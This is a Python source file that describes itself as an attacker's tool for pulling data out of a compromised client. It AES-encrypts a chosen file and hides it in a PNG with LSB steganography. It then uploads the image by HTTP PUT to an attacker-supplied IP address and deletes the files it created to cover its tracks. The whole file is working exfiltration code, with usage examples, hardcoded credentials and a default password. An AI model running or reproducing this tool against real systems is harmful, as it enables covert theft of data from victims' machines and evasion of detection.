"""
    About:

    This is the master program for simple data extraction. The process is carried out one file at a time with
    the idea being that an attacker is traversing the file system of the compromised client and extracting as
    needed. First, we create a very simple PNG file to use as a cover file if one is not specified. Then, an
    encrypted copy of the desired file is created using AES-256. The newly created encrypted file is hidden
    in the cover file using LSB steganography. Now carrying the encrypted file, the cover file is sent back to
    the attacker in the form of a PUT request over port 80. The justification here is that an image being sent
    over the Internet is not particularly out of the ordinary, and even if examined, the hidden contents of the
    image cannot simply be pieced together. Finally, any files created by this program are deleted for the sake
    of keeping up appearances.

    Notable Limitations:

    -Only PNG files may be used as cover and output files
    -The cover file must be larger than the file to be embedded
    -A file to embed as well as a destination IP address must be specified, defaults do not exist

    Example Usage:

    % python3 bundle.py -e test.txt -d 111.222.333.444
    % python3 bundle.py -e test.txt -p password123 -d 111.222.333.444
    % python3 bundle.py -e test.txt -p password123 -d 111.222.333.444 -o test.png
"""

import argparse
from PIL import Image
import pyAesCrypt
from cryptosteganography import CryptoSteganography
import requests
import os

DEFAULT_COVER_FILE = 'cover.png'
DEFAULT_OUTFILE = 'outfile.png'
DEFAULT_ENCRYPTION_PASSWORD = 'Elm34lp9Avm43l2C3n4lkmM1kQwe'

"""
    The following section contains the primary functions of the program
    ----------------------------------------------------------------------------
"""

def create_default_image():
    img = Image.new('RGB', (4096, 3072), (153, 51, 255))
    img.save(DEFAULT_COVER_FILE, "PNG")

def create_copy_image(cover):
    try: 
        img = Image.open(cover)
        img.save(cover[:-4] + "_copy" + cover[-4:])
    except IOError: 
        pass

def encrypt_file(embed, password):
    with open(embed, "rb") as infile:
        with open(embed + ".aes", "wb") as outfile:
            pyAesCrypt.encryptStream(infile, outfile, password, (64 * 1024))

def hide_file(embed, cover, outfile, password):
    data = None
    with open(embed, "rb") as infile:
        data = infile.read()
    CryptoSteganography(password).hide(cover, DEFAULT_OUTFILE, data)
    check_file_rename(DEFAULT_OUTFILE, outfile)

def send_file(outfile, dst):
    with open(outfile, 'rb') as to_send:
        mydata = to_send.read()
        _ = requests.put('http://' + dst + '/uploads/' + outfile,
            data=mydata,
            auth=('tester', 't3$T1nG'),
            headers={'content-type':'text/plain'},
            params={'file': to_send}
        )

def clean_up(embed, cover, outfile):
    os.remove(embed + '.aes')
    os.remove(cover)
    os.remove(outfile)

"""
    The following section contains the secondary/helper functions of the program
    ----------------------------------------------------------------------------
"""

def validate_option(option, default):
    if option is not None:
        return option
    else:
        return default

def validate_file(filename, default):
    if (filename is not None) and (check_file_extension(filename)):
        return filename
    else:
        return default

def check_file_extension(filename):
    if (filename[-4:] == '.png') or (filename[-4:] == '.PNG'):
        return True
    else:
        return False

def check_file_rename(current_name, new_name):
    if new_name != DEFAULT_OUTFILE:
        os.rename(current_name, new_name)

"""
    The following section contains the main function of the program
    ----------------------------------------------------------------------------
"""

def Main():
    parser = argparse.ArgumentParser(description='command-line args')

    parser.add_argument('-e', '--embed', help='file to embed')
    parser.add_argument('-c', '--cover', help='cover file')
    parser.add_argument('-p', '--password', help='encryption password')
    parser.add_argument('-d', '--destination', help='destination IP address')
    parser.add_argument('-o', '--outfile', help='output file')
    
    args = parser.parse_args()
    password = validate_option(args.password, DEFAULT_ENCRYPTION_PASSWORD)
    cover = validate_file(args.cover, DEFAULT_COVER_FILE)
    outfile = validate_file(args.outfile, DEFAULT_OUTFILE)

    """
        If a cover file is specified, a copy of the file is created and used
        so that the provided image can be used repeatedly. Otherwise, the
        default image is created and used
    """
    if cover == DEFAULT_COVER_FILE:
        create_default_image()
    else:
        create_copy_image(cover)
        cover = cover[:-4] + "_copy" + cover[-4:]

    """
        Summary of process:
        1) Create encrypted copy the desired file
        2) Hide the encrypted copy in a PNG
        3) Send the PNG to the attacker over port 80
        4) Delete manually created files
    """
    encrypt_file(args.embed, password)
    hide_file(args.embed + ".aes", cover, outfile, password)
    send_file(outfile, args.destination)
    clean_up(args.embed, cover, outfile)

if __name__ == '__main__':
    Main()

"""
    ----------------------------------------------------------------------------
"""
